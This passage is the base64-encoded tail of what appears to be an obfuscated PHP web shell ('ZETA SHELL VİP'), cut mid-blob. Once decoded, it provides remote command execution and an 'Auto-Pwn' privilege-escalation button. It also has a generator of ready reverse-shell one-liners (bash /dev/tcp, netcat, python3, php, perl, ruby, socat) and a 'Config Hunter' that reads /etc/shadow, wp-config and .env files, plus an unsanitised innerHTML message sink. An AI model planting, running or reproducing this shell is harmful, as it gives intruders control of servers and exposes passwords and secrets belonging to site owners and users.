xidXR0b24gY2xhc3M9InF1aWNrLWNtZC1idG4iIG9uY2xpY2s9InNldENtZCgndW5hbWUgLWEnKSI+dW5hbWUgLWE8L2J1dHRvbj4KICAgICAgICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJxdWljay1jbWQtYnRuIiBvbmNsaWNrPSJzZXRDbWQoJ3BzIGF1eCcpIj5wcyBhdXg8L2J1dHRvbj4KICAgICAgICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJxdWljay1jbWQtYnRuIiBvbmNsaWNrPSJzZXRDbWQoJ25ldHN0YXQgLXR1bG5wJykiPm5ldHN0YXQ8L2J1dHRvbj4KICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgPGZvcm0gbWV0aG9kPSJwb3N0IiBhY3Rpb249Ij9wPTw/cGhwIGVjaG8gdXJsZW5jb2RlKGVuY29kZVBhdGgoUEFUSCkpOyA/PiIgY2xhc3M9ImNvbW1hbmQtZm9ybSI+CiAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIGlkPSJjb21tYW5kX2lucHV0IiBuYW1lPSJjb21tYW5kIiBwbGFjZWhvbGRlcj0iRW50ZXIgY29tbWFuZC4uLiIgdmFsdWU9Ijw/cGhwIGVjaG8gaXNzZXQoJF9QT1NUWydjb21tYW5kJ10pID8gaHRtbHNwZWNpYWxjaGFycygkX1BPU1RbJ2NvbW1hbmQnXSkgOiAnJzsgPz4iIHJlcXVpcmVkPgogICAgICAgICAgICAgICAgIDxidXR0b24gdHlwZT0ic3VibWl0IiBuYW1lPSJydW5fY29tbWFuZCIgY2xhc3M9ImFjdGlvbi1idG4iPlJ1biE8L2J1dHRvbj4KICAgICAgICAgICAgIDwvZm9ybT4KICAgICAgICAgICAgIDw/cGhwIGlmICgkX1NFUlZFUlsnUkVRVUVTVF9NRVRIT0QnXSA9PT0gJ1BPU1QnICYmIGlzc2V0KCRfUE9TVFsncnVuX2NvbW1hbmQnXSkpOiA/PgogICAgICAgICAgICAgICAgIDxoND5PdXRwdXQ6PC9oND4KICAgICAgICAgICAgICAgICA8cHJlIGNsYXNzPSJjb21tYW5kLW91dHB1dCI+PD9waHAgZWNobyAkYWN0aW9uX3Jlc3VsdF9vdXRwdXQ7ID8+PC9wcmU+CiAgICAgICAgICAgICA8P3BocCBlbmRpZjsgPz4KICAgICAgICA8L2Rpdj4KCiAgICAgICAgIDwhLS0gQcOnxLFsxLFyL0thcGFuxLFyIELDtmzDvG1sZXIgLS0+CiAgICAgICAgPGRldGFpbHMgY2xhc3M9ImNvbGxhcHNpYmxlLXNlY3Rpb24iIDw/cGhwIGVjaG8gKCRfU0VSVkVSWydSRVFVRVNUX01FVEhPRCddID09PSAnUE9TVCcgJiYgKGlzc2V0KCRfUE9TVFsnYW5hbHl6ZV9zeXN0ZW0nXSkgfHwgaXNzZXQoJF9QT1NUWydhdHRlbXB0X2F1dG9wd24nXSkpKSA/ICdvcGVuJyA6ICcnOyAvLyBBbmFsaXogeWFwxLFsZMSxeXNhIGHDp8SxayBnZWxzaW4gPz4+CiAgICAgICAgICAgIDxzdW1tYXJ5PjxpIGNsYXNzPSJmYXMgZmEtc2hpZWxkLWFsdCI+PC9pPiBTeXN0ZW0gSW5mbyAmIEV4cGxvaXQgSGVscGVyPC9zdW1tYXJ5PgogICAgICAgICAgICA8ZGl2PgogICAgICAgICAgICAgICAgPGZvcm0gbWV0aG9kPSJwb3N0IiBhY3Rpb249Ij9wPTw/cGhwIGVjaG8gdXJsZW5jb2RlKGVuY29kZVBhdGgoUEFUSCkpOyA/PiIgc3R5bGU9ImRpc3BsYXk6aW5saW5lLWJsb2NrOyI+IDxidXR0b24gdHlwZT0ic3VibWl0IiBuYW1lPSJhbmFseXplX3N5c3RlbSIgY2xhc3M9ImFjdGlvbi1idG4iPkFuYWx5emUgU3lzdGVtPC9idXR0b24+IDwvZm9ybT4KICAgICAgICAgICAgICAgIDxmb3JtIG1ldGhvZD0icG9zdCIgYWN0aW9uPSI/cD08P3BocCBlY2hvIHVybGVuY29kZShlbmNvZGVQYXRoKFBBVEgpKTsgPz4iIHN0eWxlPSJkaXNwbGF5OmlubGluZS1ibG9jazsiPiA8YnV0dG9uIHR5cGU9InN1Ym1pdCIgbmFtZT0iYXR0ZW1wdF9hdXRvcHduIiBjbGFzcz0iYWN0aW9uLWJ0biIgc3R5bGU9ImJhY2tncm91bmQ6I2YwYWQ0ZTtjb2xvcjojMDAwOyIgb25jbGljaz0icmV0dXJuIGNvbmZpcm0oJ0F1dG8tUHduPycpIj5UcnkgQXV0by1Qd24hPC9idXR0b24+IDwvZm9ybT4KICAgICAgICAgICAgICAgIDw/cGhwIGlmICgoJF9TRVJWRVJbJ1JFUVVFU1RfTUVUSE9EJ10gPT09ICdQT1NUJyAmJiAoaXNzZXQoJF9QT1NUWydhbmFseXplX3N5c3RlbSddKSB8fCBpc3NldCgkX1BPU1RbJ2F0dGVtcHRfYXV0b3B3biddKSkpKTogPz4KICAgICAgICAgICAgICAgICAgICAgPGg0PkFuYWx5c2lzIC8gQXR0ZW1wdCBSZXN1bHQ6PC9oND4KICAgICAgICAgICAgICAgICAgICAgPHByZSBjbGFzcz0iaW5mby1vdXRwdXQiPjw/cGhwIGVjaG8gJGFjdGlvbl9yZXN1bHRfb3V0cHV0OyA/PjwvcHJlPgogICAgICAgICAgICAgICAgICAgICA8cD4gPGEgaHJlZj0iaHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vIiB0YXJnZXQ9Il9ibGFuayIgY2xhc3M9ImFjdGlvbi1idG4iPlNlYXJjaCBFeHBsb2l0LURCPC9hPiA8YSBocmVmPSJodHRwczovL2d0Zm9iaW5zLmdpdGh1Yi5pby8iIHRhcmdldD0iX2JsYW5rIiBjbGFzcz0iYWN0aW9uLWJ0biI+Q2hlY2sgR1RGT0JpbnM8L2E+IDwvcD4KICAgICAgICAgICAgICAgICA8P3BocCBlbmRpZjsgPz4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgPC9kZXRhaWxzPgoKICAgICAgICA8ZGV0YWlscyBjbGFzcz0iY29sbGFwc2libGUtc2VjdGlvbiI+IDxzdW1tYXJ5PjxpIGNsYXNzPSJmYXMgZmEtc2F0ZWxsaXRlLWRpc2giPjwvaT4gUmV2ZXJzZSBTaGVsbCBIZWxwZXI8L3N1bW1hcnk+IDxkaXY+IDxmb3JtIG1ldGhvZD0icG9zdCIgb25zdWJtaXQ9ImdlbmVyYXRlU2hlbGwoZXZlbnQpIj4gWW91ciBJUDogPGlucHV0IHR5cGU9InRleHQiIGlkPSJyZXZfaXAiIHZhbHVlPSI8P3BocCBlY2hvIGh0bWxzcGVjaWFsY2hhcnMoJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10pOyA/PiIgc3R5bGU9IndpZHRoOjE1MHB4OyBkaXNwbGF5OmlubGluZS1ibG9jazsgbWFyZ2luLXJpZ2h0OjEwcHg7Ij4gUG9ydDogPGlucHV0IHR5cGU9InRleHQiIGlkPSJyZXZfcG9ydCIgdmFsdWU9IjQ0NDQiIHN0eWxlPSJ3aWR0aDo4MHB4OyBkaXNwbGF5OmlubGluZS1ibG9jazsgbWFyZ2luLXJpZ2h0OjEwcHg7Ij4gVHlwZTogPHNlbGVjdCBpZD0ic2hlbGxfdHlwZSIgc3R5bGU9ImJhY2tncm91bmQ6dmFyKC0tY29kZS1iZyk7IGNvbG9yOnZhcigtLXRleHQtY29sb3IpOyBib3JkZXI6MXB4IHNvbGlkIHZhcigtLWJvcmRlci1jb2xvcik7IHBhZGRpbmc6IDRweDsiPiA8b3B0aW9uIHZhbHVlPSJiYXNoX3RjcCI+QmFzaCBUQ1A8L29wdGlvbj4gPG9wdGlvbiB2YWx1ZT0ibmNfZSI+TmV0Y2F0IC1lPC9vcHRpb24+IDxvcHRpb24gdmFsdWU9Im5jX21rZmlmbyI+TmV0Y2F0IG1rZmlmbzwvb3B0aW9uPiA8b3B0aW9uIHZhbHVlPSJweXRob24zIj5QeXRob24zPC9vcHRpb24+IDxvcHRpb24gdmFsdWU9InBocCI+UEhQPC9vcHRpb24+IDxvcHRpb24gdmFsdWU9InBlcmwiPlBlcmw8L29wdGlvbj4gPG9wdGlvbiB2YWx1ZT0icnVieSI+UnVieTwvb3B0aW9uPiA8b3B0aW9uIHZhbHVlPSJzb2NhdCI+U29jYXQ8L29wdGlvbj4gPC9zZWxlY3Q+IDxidXR0b24gdHlwZT0ic3VibWl0IiBjbGFzcz0iYWN0aW9uLWJ0biI+R2VuZXJhdGUhPC9idXR0b24+IDwvZm9ybT4gPHByZSBpZD0iZ2VuZXJhdGVkX3NoZWxsX291dHB1dCIgY2xhc3M9ImNvbW1hbmQtb3V0cHV0IiBzdHlsZT0ibWFyZ2luLXRvcDoxMHB4OyBkaXNwbGF5Om5vbmU7Ij48L3ByZT4gPC9kaXY+IDwvZGV0YWlscz4KCiAgICAgICAgPGRldGFpbHMgY2xhc3M9ImNvbGxhcHNpYmxlLXNlY3Rpb24iIDw/cGhwIGVjaG8gKCRfU0VSVkVSWydSRVFVRVNUX01FVEhPRCddID09PSAnR0VUJyAmJiBpc3NldCgkX0dFVFsncmVhZF9jb25maWcnXSkpID8gJ29wZW4nIDogJyc7ID8+PgogICAgICAgICAgICAgPHN1bW1hcnk+PGkgY2xhc3M9ImZhcyBmYS1rZXkiPjwvaT4gQ29uZmlnIEh1bnRlcjwvc3VtbWFyeT4KICAgICAgICAgICAgIDxkaXY+IDxwPkF0dGVtcHQgdG8gcmVhZCBjb21tb24gY29uZmlndXJhdGlvbiBmaWxlczo8L3A+IDxkaXYgY2xhc3M9InF1aWNrLWNtZC1idXR0b25zIj4gPGEgaHJlZj0iP3JlYWRfY29uZmlnPXBhc3N3ZCZwPTw/cGhwIGVjaG8gdXJsZW5jb2RlKGVuY29kZVBhdGgoUEFUSCkpOyA/PiI+PGJ1dHRvbiBjbGFzcz0iY29uZmlnLWJ0biI+L2V0Yy9wYXNzd2Q8L2J1dHRvbj48L2E+IDxhIGhyZWY9Ij9yZWFkX2NvbmZpZz1zaGFkb3cmcD08P3BocCBlY2hvIHVybGVuY29kZShlbmNvZGVQYXRoKFBBVEgpKTsgPz4iPjxidXR0b24gY2xhc3M9ImNvbmZpZy1idG4iIHN0eWxlPSJiYWNrZ3JvdW5kOiNmMGFkNGU7Y29sb3I6IzAwMDsiPi9ldGMvc2hhZG93PC9idXR0b24+PC9hPiA8YSBocmVmPSI/cmVhZF9jb25maWc9d3Bjb25maWcmcD08P3BocCBlY2hvIHVybGVuY29kZShlbmNvZGVQYXRoKFBBVEgpKTsgPz4iPjxidXR0b24gY2xhc3M9ImNvbmZpZy1idG4iPndwLWNvbmZpZyAoaGVyZSk8L2J1dHRvbj48L2E+IDxhIGhyZWY9Ij9yZWFkX2NvbmZpZz13cGNvbmZpZ191cCZwPTw/cGhwIGVjaG8gdXJsZW5jb2RlKGVuY29kZVBhdGgoUEFUSCkpOyA/PiI+PGJ1dHRvbiBjbGFzcz0iY29uZmlnLWJ0biI+d3AtY29uZmlnICh1cCk8L2J1dHRvbj48L2E+IDxhIGhyZWY9Ij9yZWFkX2NvbmZpZz1lbnYmcD08P3BocCBlY2hvIHVybGVuY29kZShlbmNvZGVQYXRoKFBBVEgpKTsgPz4iPjxidXR0b24gY2xhc3M9ImNvbmZpZy1idG4iPi5lbnYgKGhlcmUpPC9idXR0b24+PC9hPiA8YSBocmVmPSI/cmVhZF9jb25maWc9ZW52X3VwJnA9PD9waHAgZWNobyB1cmxlbmNvZGUoZW5jb2RlUGF0aChQQVRIKSk7ID8+Ij48YnV0dG9uIGNsYXNzPSJjb25maWctYnRuIj4uZW52ICh1cCk8L2J1dHRvbj48L2E+IDxhIGhyZWY9Ij9yZWFkX2NvbmZpZz1hcGFjaGVfY29uZiZwPTw/cGhwIGVjaG8gdXJsZW5jb2RlKGVuY29kZVBhdGgoUEFUSCkpOyA/PiI+PGJ1dHRvbiBjbGFzcz0iY29uZmlnLWJ0biI+YXBhY2hlMi5jb25mPC9idXR0b24+PC9hPiA8YSBocmVmPSI/cmVhZF9jb25maWc9bmdpbnhfY29uZiZwPTw/cGhwIGVjaG8gdXJsZW5jb2RlKGVuY29kZVBhdGgoUEFUSCkpOyA/PiI+PGJ1dHRvbiBjbGFzcz0iY29uZmlnLWJ0biI+bmdpbnguY29uZjwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iP3JlYWRfY29uZmlnPXBocF9pbmkmcD08P3BocCBlY2hvIHVybGVuY29kZShlbmNvZGVQYXRoKFBBVEgpKTsgPz4iPjxidXR0b24gY2xhc3M9ImNvbmZpZy1idG4iPnBocC5pbmk8L2J1dHRvbj48L2E+IDwvZGl2PgogICAgICAgICAgICAgICAgICA8P3BocCBpZiAoJF9TRVJWRVJbJ1JFUVVFU1RfTUVUSE9EJ10gPT09ICdHRVQnICYmIGlzc2V0KCRfR0VUWydyZWFkX2NvbmZpZyddKSk6ID8+IDxoND5Db25maWcgQ29udGVudDo8L2g0PiA8cHJlIGNsYXNzPSJpbmZvLW91dHB1dCI+PD9waHAgZWNobyAkYWN0aW9uX3Jlc3VsdF9vdXRwdXQ7ID8+PC9wcmU+IDw/cGhwIGVuZGlmOyA/PgogICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgIDwvZGV0YWlscz4KCiAgICAgICAgPCEtLSBGb290ZXIgLS0+CiAgICAgICAgPGRpdiBjbGFzcz0iaGFja2VyLWZvb3RlciI+IDxwPn5+IFpFVEEgU0hFTEwgVsSwUCA8P3BocCBlY2hvICRTSEVMTF9WRVJTSU9OOyA/PiBjb2RlZCBieSA8c3BhbiBzdHlsZT0iY29sb3I6dmFyKC0taGVhZGVyLWNvbG9yKTsgZm9udC13ZWlnaHQ6Ym9sZDsiPmJlcm9mYzwvc3Bhbj4gfn48L3A+IDxwPiA8YSBocmVmPSJodHRwczovL2luc3RhZ3JhbS5jb20vQmVyb2ZjIiB0YXJnZXQ9Il9ibGFuayI+PGkgY2xhc3M9ImZhYiBmYS1pbnN0YWdyYW0iPjwvaT4gSW5zdGFncmFtOiBCZXJvZmM8L2E+IDwvcD4gPC9kaXY+CgogICAgPC9kaXY+IDwhLS0gY29udGFpbmVyLWZsdWlkIHNvbnUgLS0+CiAgICA8c2NyaXB0PgogICAgICAgIC8vIC0tLSBTaGVsbCBKYXZhU2NyaXB0IC0tLQogICAgICAgIHZhciB0eXBlZCA9IG5ldyBUeXBlZCgnI3NoZWxsLXRpdGxlJywgeyBzdHJpbmdzOiBbJ0VTQ09SVCBTSEVMTCA8P3BocCBlY2hvICRTSEVMTF9WRVJTSU9OOyA/PicsICdTWVNURU1fQlJFQUNIRURfQUxQSEEnLCAnQktCT0ZGSUNJQUwnLCAnV0FJVElOR19DSEFPUy4uLl4xMDAwJ10sIHR5cGVTcGVlZDogNDAsIGJhY2tTcGVlZDogMjUsIGxvb3A6IHRydWUsIHNob3dDdXJzb3I6IHRydWUsIGN1cnNvckNoYXI6ICfilognLCBzbWFydEJhY2tzcGFjZTogdHJ1ZSB9KTsKICAgICAgICBmdW5jdGlvbiBwZXJtc190b19zdHJpbmdfanMocGVybXNPY3RhbFN0cikgeyAvKiAuLi4gSlMgcGVybXMga29kdSAuLi4gKi8gaWYgKCFwZXJtc09jdGFsU3RyIHx8IHBlcm1zT2N0YWxTdHIgPT09ICc/Pz8/JykgcmV0dXJuICdVbmtub3duJzsgY29uc3QgcGVybXMgPSBwYXJzZUludChwZXJtc09jdGFsU3RyLCA4KTsgaWYgKGlzTmFOKHBlcm1zKSkgcmV0dXJuICdJbnZhbGlkJzsgbGV0IGluZm8gPSAnJzsgaWYgKChwZXJtcyAmIDB4QzAwMCkgPT09IDB4QzAwMCkgeyBpbmZvID0gJ3MnOyB9IGVsc2UgaWYgKChwZXJtcyAmIDB4QTAwMCkgPT09IDB4QTAwMCkgeyBpbmZvID0gJ2wnOyB9IGVsc2UgaWYgKChwZXJtcyAmIDB4ODAwMCkgPT09IDB4ODAwMCkgeyBpbmZvID0gJy0nOyB9IGVsc2UgaWYgKChwZXJtcyAmIDB4NjAwMCkgPT09IDB4NjAwMCkgeyBpbmZvID0gJ2InOyB9IGVsc2UgaWYgKChwZXJtcyAmIDB4NDAwMCkgPT09IDB4NDAwMCkgeyBpbmZvID0gJ2QnOyB9IGVsc2UgaWYgKChwZXJtcyAmIDB4MjAwMCkgPT09IDB4MjAwMCkgeyBpbmZvID0gJ2MnOyB9IGVsc2UgaWYgKChwZXJtcyAmIDB4MTAwMCkgPT09IDB4MTAwMCkgeyBpbmZvID0gJ3AnOyB9IGVsc2UgeyBpbmZvID0gJ3UnOyB9IGluZm8gKz0gKChwZXJtcyAmIDB4MDEwMCkgPyAncicgOiAnLScpOyBpbmZvICs9ICgocGVybXMgJiAweDAwODApID8gJ3cnIDogJy0nKTsgaW5mbyArPSAoKHBlcm1zICYgMHgwMDQwKSA/ICgocGVybXMgJiAweDA4MDApID8gJ3MnIDogJ3gnICkgOiAoKHBlcm1zICYgMHgwODAwKSA/ICdTJyA6ICctJykpOyBpbmZvICs9ICgocGVybXMgJiAweDAwMjApID8gJ3InIDogJy0nKTsgaW5mbyArPSAoKHBlcm1zICYgMHgwMDEwKSA/ICd3JyA6ICctJyk7IGluZm8gKz0gKChwZXJtcyAmIDB4MDAwOCkgPyAoKHBlcm1zICYgMHgwNDAwKSA/ICdzJyA6ICd4JyApIDogKChwZXJtcyAmIDB4MDQwMCkgPyAnUycgOiAnLScpKTsgaW5mbyArPSAoKHBlcm1zICYgMHgwMDA0KSA/ICdyJyA6ICctJyk7IGluZm8gKz0gKChwZXJtcyAmIDB4MDAwMikgPyAndycgOiAnLScpOyBpbmZvICs9ICgocGVybXMgJiAweDAwMDEpID8gKChwZXJtcyAmIDB4MDIwMCkgPyAndCcgOiAneCcgKSA6ICgocGVybXMgJiAweDAyMDApID8gJ1QnIDogJy0nKSk7IHJldHVybiBpbmZvOyB9CiAgICAgICAgZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnLnBlcm1zJykuZm9yRWFjaChlbCA9PiB7IGVsLnRpdGxlID0gcGVybXNfdG9fc3RyaW5nX2pzKGVsLnRleHRDb250ZW50KTsgfSk7CiAgICAgICAgZnVuY3Rpb24gc2V0Q21kKGNtZCkgeyBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnY29tbWFuZF9pbnB1dCcpLnZhbHVlID0gY21kOyB9CiAgICAgICAgZnVuY3Rpb24gZ2VuZXJhdGVTaGVsbChldmVudCkgeyAvKiAuLi4gUmV2ZXJzZSBTaGVsbCBKUyBLb2R1IC4uLiAqLyBldmVudC5wcmV2ZW50RGVmYXVsdCgpOyBjb25zdCBpcCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdyZXZfaXAnKS52YWx1ZTsgY29uc3QgcG9ydCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdyZXZfcG9ydCcpLnZhbHVlOyBjb25zdCB0eXBlID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3NoZWxsX3R5cGUnKS52YWx1ZTsgbGV0IGNvbW1hbmQgPSAnJzsgaWYgKCFpcCB8fCAhcG9ydCkgeyBhbGVydCgnSVAgdmUgUG9ydCBnaXIhJyk7IHJldHVybjsgfSBzd2l0Y2godHlwZSkgeyBjYXNlICdiYXNoX3RjcCc6IGNvbW1hbmQgPSBgYmFzaCAtaSA+JiAvZGV2L3RjcC8ke2lwfS8ke3BvcnR9IDA+JjFgOyBicmVhazsgY2FzZSAnbmNfZSc6IGNvbW1hbmQgPSBgbmMgLWUgL2Jpbi9iYXNoICR7aXB9ICR7cG9ydH1gOyBicmVhazsgY2FzZSAnbmNfbWtmaWZvJzogY29tbWFuZCA9IGBybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vYmFzaCAtaSAyPiYxfG5jICR7aXB9ICR7cG9ydH0gPi90bXAvZmA7IGJyZWFrOyBjYXNlICdweXRob24zJzogY29tbWFuZCA9IGBweXRob24zIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiJHtpcH0iLCR7cG9ydH0pKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9iYXNoIiwiLWkiXSk7J2A7IGJyZWFrOyBjYXNlICdwaHAnOiBjb21tYW5kID0gYHBocCAtciAnJHNvY2s9ZnNvY2tvcGVuKCIke2lwfSIsJHtwb3J0fSk7ZXhlYygiL2Jpbi9iYXNoIC1pIDwmMyA+JjMgMj4mMyIpOydgOyBicmVhazsgY2FzZSAncGVybCc6IGNvbW1hbmQgPSBgcGVybCAtZSAndXNlIFNvY2tldDskaT0iJHtpcH0iOyRwPSR7cG9ydH07c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9iYXNoIC1pIik7fTsnYDsgYnJlYWs7IGNhc2UgJ3J1YnknOiBjb21tYW5kID0gYHJ1YnkgLXJzb2NrZXQgLWUnZj1UQ1BTb2NrZXQub3BlbigiJHtpcH0iLCR7cG9ydH0pLnRvX2k7ZXhlYyBzcHJpbnRmKCIvYmluL2Jhc2ggLWkgPCYlZCA+JiVkIDI+JiVkIixmLGYsZiknYDsgYnJlYWs7IGNhc2UgJ3NvY2F0JzogY29tbWFuZCA9IGBzb2NhdCB0Y3AtY29ubmVjdDoke2lwfToke3BvcnR9IGV4ZWM6L2Jpbi9iYXNoLHB0eSxzdGRlcnIsc2V0c2lkLHNpZ2ludCxzYW5lYDsgYnJlYWs7IGRlZmF1bHQ6IGNvbW1hbmQgPSAnVW5rbm93biB0eXBlJzsgfSBjb25zdCBvdXRwdXRBcmVhID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2dlbmVyYXRlZF9zaGVsbF9vdXRwdXQnKTsgb3V0cHV0QXJlYS50ZXh0Q29udGVudCA9IGNvbW1hbmQ7IG91dHB1dEFyZWEuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7IGNvbnN0IHNlbGVjdGlvbiA9IHdpbmRvdy5nZXRTZWxlY3Rpb24oKTsgY29uc3QgcmFuZ2UgPSBkb2N1bWVudC5jcmVhdGVSYW5nZSgpOyByYW5nZS5zZWxlY3ROb2RlQ29udGVudHMob3V0cHV0QXJlYSk7IHNlbGVjdGlvbi5yZW1vdmVBbGxSYW5nZXMoKTsgc2VsZWN0aW9uLmFkZFJhbmdlKHJhbmdlKTsgdHJ5IHsgZG9jdW1lbnQuZXhlY0NvbW1hbmQoJ2NvcHknKTsgYWxlcnQoJ0tvbXV0IGtvcHlhbGFuZMSxIScpOyB9IGNhdGNoIChlcnIpIHsgYWxlcnQoJ01hbnVlbCBrb3B5YWxhIScpOyB9IH0KICAgICAgICAvLyBVUkwnZGVuIGdlbGVuIG1lc2FqxLEgZ8O2c3RlcgogICAgICAgICBkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCdET01Db250ZW50TG9hZGVkJywgZnVuY3Rpb24oKSB7IGNvbnN0IHVybFBhcmFtcyA9IG5ldyBVUkxTZWFyY2hQYXJhbXMod2luZG93LmxvY2F0aW9uLnNlYXJjaCk7IGNvbnN0IG1zZyA9IHVybFBhcmFtcy5nZXQoJ21zZycpOyBjb25zdCBtc2dUeXBlID0gdXJsUGFyYW1zLmdldCgnbXNnX3R5cGUnKTsgaWYgKG1zZykgeyBjb25zdCBtc2dEaXYgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsgbXNnRGl2LmNsYXNzTmFtZSA9ICdtZXNzYWdlICcgKyAobXNnVHlwZSB8fCAnaW5mbycpOyBtc2dEaXYuaW5uZXJIVE1MID0gJzxpIGNsYXNzPSJmYXMgZmEtaW5mby1jaXJjbGUiPjwvaT4gJyArIGRlY29kZVVSSUNvbXBvbmVudChtc2cucmVwbGFjZSgvXCsvZywgJyAnKSk7IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy5icmVhZGNydW1iJykuaW5zZXJ0QWRqYWNlbnRFbGVtZW50KCdhZnRlcmVuZCcsIG1zZ0Rpdik7IHNldFRpbWVvdXQoKCkgPT4geyBpZihtc2dEaXYpIG1zZ0Rpdi5zdHlsZS5kaXNwbGF5PSdub25lJzsgfSwgNDAwMCk7IGNvbnN0IGN1cnJlbnRVcmwgPSBuZXcgVVJMKHdpbmRvdy5sb2NhdGlvbik7IGN1cnJlbnRVcmwuc2VhcmNoUGFyYW1zLmRlbGV0ZSgnbXNnJyk7IGN1cnJlbnRVcmwuc2VhcmNoUGFyYW1zLmRlbGV0ZSgnbXNnX3R5cGUnKTsgaGlzdG9yeS5yZXBsYWNlU3RhdGUobnVsbCwgJycsIGN1cnJlbnRVcmwudG9TdHJpbmcoKSk7IH0gfSk7CiAgICA8L3NjcmlwdD4KPC9ib2R5Pgo8L2h0bWw+"));
